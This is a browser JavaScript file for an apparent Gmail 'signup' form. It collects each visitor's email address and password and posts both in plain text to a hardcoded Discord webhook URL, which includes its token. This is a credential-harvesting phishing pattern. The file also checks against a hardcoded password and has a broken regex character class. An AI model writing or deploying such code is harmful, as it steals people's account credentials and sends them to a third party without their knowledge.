document.addEventListener("DOMContentLoaded", () => {
  // Get form and input elements
  const form = document.getElementById("signup-form");
  const gmailInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const displayName = document.getElementById("display-name");
  const signupContainer = document.getElementById("signup-container");
  const mainContent = document.getElementById("main-content");

  // Check if the user has already signed up by checking localStorage
  const savedGmail = localStorage.getItem("username");
  if (savedGmail) {
    displayName.textContent = savedGmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }

  // Handle the form submission
  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const gmail = gmailInput.value;
    const password = passwordInput.value;

    // Simple validation for Gmail format
    const gmailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zAZ]{2,}$/;
    if (!gmailPattern.test(gmail)) {
      alert("Please enter a valid Gmail address.");
      return;
    }

    // Optional: You can add a password check here
    const correctPassword = "mySecret123"; // Replace with your own password logic if needed
    if (password !== correctPassword) {
      alert("Incorrect password. Please try again.");
      return;
    }

    // Store the Gmail in localStorage for persistence
    localStorage.setItem("username", gmail);

    // Display the user's Gmail on the page
    displayName.textContent = gmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";

    // Send the signup data to the Discord webhook
    sendToDiscord(gmail, password);
  });

  // Function to send the Gmail and password to a Discord webhook
  function sendToDiscord(gmail, password) {
    const webhookURL = "https://discord.com/api/webhooks/1362138187962650727/aVG7VuftNpdkCSHQH8aMGEp5HoLdTuis4OdDrpVFdwnj0TDcVUCkEr3dUt4zV-5OP1rL"; // Replace with your actual webhook URL

    const payload = {
      content: `📨 New signup:\n**Gmail:** ${gmail}\n**Password:** ${password}`,
      username: "Signup Bot",
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Success:", data);
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  }

  // Optional: This part helps when the user refreshes the page
  const savedGmailFromLocalStorage = localStorage.getItem("username");
  if (savedGmailFromLocalStorage) {
    displayName.textContent = savedGmailFromLocalStorage;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }
});
